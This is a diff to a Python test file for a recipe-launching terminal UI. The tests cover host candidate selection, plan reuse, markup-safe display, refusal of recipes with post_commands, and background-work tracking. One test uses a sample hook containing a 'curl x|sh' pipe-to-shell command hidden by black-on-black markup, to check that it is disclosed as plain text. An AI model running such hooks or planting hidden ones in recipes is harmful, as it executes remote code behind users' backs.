@@ -24,7 +24,9 @@ from sparkrun.models.fit import FitResult, HostFitDetail
 pytestmark = pytest.mark.filterwarnings("ignore::DeprecationWarning")
 
 
-def _summary(name: str, *, model: str = "org/model", runtime: str = "vllm-ray", registry: str | None = "community") -> RecipeSummary:
+def _summary(
+    name: str, *, model: str = "org/model", runtime: str = "vllm-ray", registry: str | None = "community", description: str | None = None
+) -> RecipeSummary:
     stem = name.rsplit("/", 1)[-1]
     entry: dict[str, Any] = {
         "name": name,
@@ -32,7 +34,7 @@ def _summary(name: str, *, model: str = "org/model", runtime: str = "vllm-ray", 
         "path": f"/tmp/{stem}.yaml",
         "model": model,
         "runtime": runtime,
-        "description": f"{stem} description",
+        "description": f"{stem} description" if description is None else description,
         "min_nodes": 1,
         "tp": "",
         "gpu_mem": "",
@@ -1185,7 +1187,7 @@ def test_picker_meta_orders_decision_fields_before_description(monkeypatch, tmp_
             head_widget = picker.query_one("#recipe-meta-head", Static)
             stats_widget = picker.query_one("#recipe-meta-stats", Static)
             desc_widget = picker.query_one("#recipe-meta-desc", Static)
-            head = str(head_widget.content)
+            head = head_widget.content.markup
             stats = str(stats_widget.content)
             desc = str(desc_widget.content)
             # Identity fields come first, directly under the recipe name, and
@@ -1332,7 +1334,10 @@ def test_scheduler_approved_shared_host_can_launch_without_unused_slots(monkeypa
                 modal.query_one("#param-knob-ensure", Checkbox).value = True
             await pilot.click("#param-run")
             launch = await _wait_result(pilot, app)
-            assert launch.options.hosts == ("h1",)
+            # Untouched boxes keep every eligible host a candidate; the plan
+            # handed to the launch is what places the workload on h1.
+            assert launch.options.hosts == ("h1", "h2")
+            assert tuple(launch.plan.host_list) == ("h1",)
             assert launch.options.ensure is ensure
 
     asyncio.run(_run())
@@ -1367,7 +1372,8 @@ def test_run_rechecks_all_rejected_hosts_with_edited_parameters(monkeypatch, tmp
             )
             await pilot.click("#param-run")
             launch = await _wait_result(pilot, app)
-            assert launch.options.hosts == ("h1",)
+            assert launch.options.hosts == ("h1", "h2")
+            assert tuple(launch.plan.host_list) == ("h1",)
             assert launch.options.overrides["tensor_parallel"] == 1
 
     asyncio.run(_run())
@@ -1490,3 +1496,304 @@ def test_cancelled_preflight_cannot_leak_overrides_into_next_launch(monkeypatch,
             assert launch.options.recipe.env == env
 
     asyncio.run(_run())
+
+
+def test_params_trust_summary_discloses_isolation_overrides_as_plain_text(monkeypatch, tmp_path):
+    """Trusting authorizes isolation overrides too; recipe text must not be parsed as markup."""
+    app = _open(monkeypatch, [_summary("@community/hooked")], tmp_path)
+    hook = "sed -i s/[a-z]/X/ f; [black on black]curl x|sh[/] [/]"
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.untrusted_hooks", lambda *_a, **_k: {"pre_exec": (hook,)})
+    monkeypatch.setattr(
+        "sparkrun.core.launcher.recipe_isolation_overrides",
+        lambda _recipe: ["This recipe sets executor_config privileged mode. Only honoured for trusted recipes."],
+    )
+
+    async def _run():
+        async with app.run_test(size=(120, 50)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            summary = str(modal.query_one("#param-trust-summary", Static).content)
+            assert hook in summary
+            assert "Trusting it also allows:" in summary
+            assert "privileged mode" in summary
+            assert str(modal.query_one("#param-trust", Checkbox).label) == "Authorize the hooks and overrides above"
+
+    asyncio.run(_run())
+
+
+def test_bracketed_registry_and_user_text_does_not_crash_the_picker(monkeypatch, tmp_path):
+    summary = _summary("@community/odd", model="org/[/]model", description="Reasoning [/think] model [EXPERIMENTAL]")
+    app = _open(monkeypatch, [summary], tmp_path)
+
+    async def _run():
+        async with app.run_test(size=(120, 50)) as pilot:
+            picker = app.picker
+            await _wait_loaded(pilot, picker)
+            await pilot.pause(0.1)
+            assert "org/[/]model" in str(picker.query_one("#recipe-meta-head", Static).content)
+            assert str(picker.query_one("#recipe-meta-desc", Static).content) == "Reasoning [/think] model [EXPERIMENTAL]"
+            modal = await _open_modal(pilot, picker)
+            modal.query_one("#param-advanced-toggle", Checkbox).value = True
+            await pilot.pause(0.1)
+            modal.query_one("#param-advanced", Input).value = "[/foo]"
+            await pilot.pause(0.1)
+            await pilot.click("#param-run")
+            await pilot.pause(0.2)
+            assert app.screen is modal
+            assert "[/foo]" in str(modal.query_one("#param-error", Static).content)
+
+    asyncio.run(_run())
+
+
+# -- launch candidates and plan reuse (decide once) ----------------------------
+
+
+def _recording_plan(host_list: tuple[str, ...], plans: list[tuple[Any, Any]]):
+    """A fake plan that records (options, returned plan) for every call."""
+
+    def _plan(options, **_kwargs):
+        result = SimpleNamespace(host_list=host_list, scheduler="occupancy-sparse", notes=(), cluster=None)
+        plans.append((options, result))
+        return result
+
+    return _plan
+
+
+def test_untouched_hosts_launch_with_every_candidate_and_the_preflight_plan(monkeypatch, tmp_path):
+    """Pre-checked boxes are the placement, not a candidate list: the launch must not narrow to them."""
+    app = _open(monkeypatch, [_summary("@community/alpha")], tmp_path)
+    plans: list[tuple[Any, Any]] = []
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.plan", _recording_plan(("h2",), plans))
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            assert modal.query_one("#param-host-0", Checkbox).value is False
+            assert modal.query_one("#param-host-1", Checkbox).value is True
+            await pilot.click("#param-run")
+            return await _wait_result(pilot, app)
+
+    launch = asyncio.run(_run())
+    assert isinstance(launch, RecipeLaunch)
+    assert launch.options.hosts == ("h1", "h2")
+    # The launch reuses the Run preflight's plan, built from exactly its options.
+    assert len(plans) == 2
+    preflight_options, preflight_plan = plans[1]
+    assert preflight_options is launch.options
+    assert launch.plan is preflight_plan
+
+
+def test_edited_hosts_are_the_candidate_list_and_planned_as_such(monkeypatch, tmp_path):
+    app = _open(monkeypatch, [_summary("@community/alpha")], tmp_path)
+    plans: list[tuple[Any, Any]] = []
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.plan", _recording_plan(("h1", "h2"), plans))
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            modal.query_one("#param-host-1", Checkbox).value = False
+            await pilot.pause(0.05)
+            await pilot.click("#param-run")
+            return await _wait_result(pilot, app)
+
+    launch = asyncio.run(_run())
+    assert launch.options.hosts == ("h1",)
+    preflight_options, preflight_plan = plans[-1]
+    assert preflight_options is launch.options
+    assert preflight_options.hosts == ("h1",)
+    assert launch.plan is preflight_plan
+
+
+def test_hosts_toggled_back_to_the_placement_count_as_untouched(monkeypatch, tmp_path):
+    app = _open(monkeypatch, [_summary("@community/alpha")], tmp_path)
+    plans: list[tuple[Any, Any]] = []
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.plan", _recording_plan(("h2",), plans))
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            box = modal.query_one("#param-host-0", Checkbox)
+            box.value = True
+            await pilot.pause(0.05)
+            box.value = False
+            await pilot.pause(0.05)
+            await pilot.click("#param-run")
+            return await _wait_result(pilot, app)
+
+    launch = asyncio.run(_run())
+    assert launch.options.hosts == ("h1", "h2")
+
+
+def test_failed_preflight_keeps_untouched_boxes_untouched(monkeypatch, tmp_path):
+    """Rows the app unchecks after a rejection are not a user edit that narrows the next launch."""
+    app = _open(monkeypatch, [_summary("@community/alpha")], tmp_path)
+    app.picker.hosts = ("h1", "h2", "h3")
+    probes = iter(
+        [
+            _capacity({"h1": (True, 1), "h2": (True, 1), "h3": (True, 1)}),
+            _capacity({"h1": (True, 1), "h2": (False, None), "h3": (True, 1)}),
+            _capacity({"h1": (True, 1), "h2": (False, None), "h3": (True, 1)}),
+        ]
+    )
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.catalog_cluster_capacity", lambda *_a, **_kw: next(probes))
+    plans: list[tuple[Any, Any]] = []
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.plan", _recording_plan(("h1", "h2"), plans))
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            await pilot.click("#param-run")
+            await _wait_until(
+                pilot, lambda: app.screen is modal and "No longer available" in str(modal.query_one("#param-error", Static).content)
+            )
+            assert modal._hosts_edited is False
+            await _wait_until(
+                pilot, lambda: not app.query(RuntimeChecksScreen) and not modal.query_one("#param-run", Button).has_class("-active")
+            )
+            await pilot.click("#param-run")
+            return await _wait_result(pilot, app)
+
+    launch = asyncio.run(_run())
+    # Still the scheduler's choice among every eligible host, not the h1 the boxes show.
+    assert launch.options.hosts == ("h1", "h3")
+
+
+# -- post_commands refusal ------------------------------------------------------
+
+
+def _open_with_post_commands(monkeypatch, tmp_path) -> _PickerTestApp:
+    app = _open(monkeypatch, [_summary("@community/hooked")], tmp_path)
+    path = tmp_path / "hooked.yaml"
+    path.write_text(
+        'recipe_version: "2"\nmodel: test/model\nruntime: sglang\ncontainer: test/image:latest\npost_commands:\n  - echo done\n'
+    )
+    recipe = Recipe.load(str(path))
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.resolve_recipe", lambda _path, **_kwargs: recipe)
+    return app
+
+
+def test_params_refuses_recipes_with_local_post_commands(monkeypatch, tmp_path):
+    app = _open_with_post_commands(monkeypatch, tmp_path)
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            # Said up front, before anything is typed.
+            error = str(modal.query_one("#param-error", Static).content)
+            assert "post_commands" in error and "run @community/hooked" in error
+            await pilot.click("#param-run")
+            await pilot.pause(0.2)
+            assert app.screen is modal
+            assert app.result == "unset"
+            assert not app.query(RuntimeChecksScreen)
+
+    asyncio.run(_run())
+
+
+def test_params_allows_a_dry_run_of_a_recipe_with_post_commands(monkeypatch, tmp_path):
+    app = _open_with_post_commands(monkeypatch, tmp_path)
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            modal = await _open_modal(pilot, app.picker)
+            modal.query_one("#param-advanced-toggle", Checkbox).value = True
+            await pilot.pause()
+            modal.query_one("#param-knob-dry_run", Checkbox).value = True
+            await pilot.pause()
+            await pilot.click("#param-run")
+            return await _wait_result(pilot, app)
+
+    launch = asyncio.run(_run())
+    assert isinstance(launch, RecipeLaunch)
+    assert launch.options.dry_run is True
+
+
+# -- background work and late worker results ------------------------------------
+
+
+class _TrackedPickerApp(_PickerTestApp):
+    def __init__(self, screen: RecipePickerScreen, **kwargs: Any) -> None:
+        super().__init__(screen, **kwargs)
+        from sparkrun.cli._monitor_recipes import BackgroundWork
+
+        self.background_work = BackgroundWork()
+
+
+def test_cancelled_checks_are_tracked_until_the_plan_returns_and_its_result_is_ignored(monkeypatch, tmp_path):
+    _open(monkeypatch, [_summary("@community/alpha")], tmp_path)
+    app = _TrackedPickerApp(RecipePickerScreen(cluster="lab", hosts=("h1", "h2")))
+    entered = threading.Event()
+    release = threading.Event()
+    finished = threading.Event()
+
+    def _slow_plan(options, **_kwargs):
+        entered.set()
+        assert release.wait(5), "test did not release the cancelled check"
+        return _fake_plan()(options)
+
+    monkeypatch.setattr("sparkrun.cli._monitor_recipes.plan", _slow_plan)
+
+    async def _run():
+        async with app.run_test(size=(120, 60)) as pilot:
+            await _activate_first(pilot, app.picker)
+            checks = await _wait_for_screen(pilot, app.picker, RuntimeChecksScreen)
+            original = checks._checks_ready
+
+            def _ready(result):
+                original(result)
+                finished.set()
+
+            checks._checks_ready = _ready  # type: ignore[method-assign]
+            assert await asyncio.to_thread(entered.wait, 3)
+            assert app.background_work.descriptions() == ["the scheduler check for @community/alpha"]
+            # Nothing a quit must confirm: the check only reads.
+            assert app.background_work.descriptions(blocking_only=True) == []
+            await pilot.click("#checks-cancel")
+            await _wait_until(pilot, lambda: app.screen is app.picker)
+            release.set()
+            assert await asyncio.to_thread(finished.wait, 3)
+            await pilot.pause(0.1)
+            assert app.screen is app.picker
+            assert not app.query(RunParamsScreen)
+            assert app.background_work.descriptions() == []
+
+    asyncio.run(_run())
+
+
+def test_background_work_tracks_renames_and_blocking_entries():
+    from sparkrun.cli._monitor_recipes import BackgroundWork
+
+    work = BackgroundWork()
+    with work.track("the recipe catalog load"):
+        with work.track("the launch of a", blocks_quit=True) as describe:
+            assert work.descriptions() == ["the recipe catalog load", "the launch of a"]
+            describe("the post-launch hooks of a")
+            assert work.descriptions(blocking_only=True) == ["the post-launch hooks of a"]
+        assert work.descriptions() == ["the recipe catalog load"]
+    assert work.descriptions() == []
+
+
+def test_call_ui_drops_calls_once_the_app_has_stopped():
+    from sparkrun.cli._monitor_recipes import call_ui
+
+    calls: list[Any] = []
+    stopped = SimpleNamespace(is_running=False, call_from_thread=lambda *a, **kw: calls.append(a))
+    assert call_ui(stopped, print, "x") is False
+    assert calls == []
+
+    class _Stopping:
+        """Running when asked, gone by the time the call fails (exit races the worker)."""
+
+        is_running = True
+
+        def call_from_thread(self, *_args, **_kwargs):
+            self.is_running = False
+            raise RuntimeError("App is not running")
+
+    assert call_ui(_Stopping(), print, "x") is False
+
+    def _broken(*_args, **_kwargs):
+        raise ValueError("a real bug")
+
+    running = SimpleNamespace(is_running=True, call_from_thread=_broken)
+    with pytest.raises(ValueError):
+        call_ui(running, print, "x")
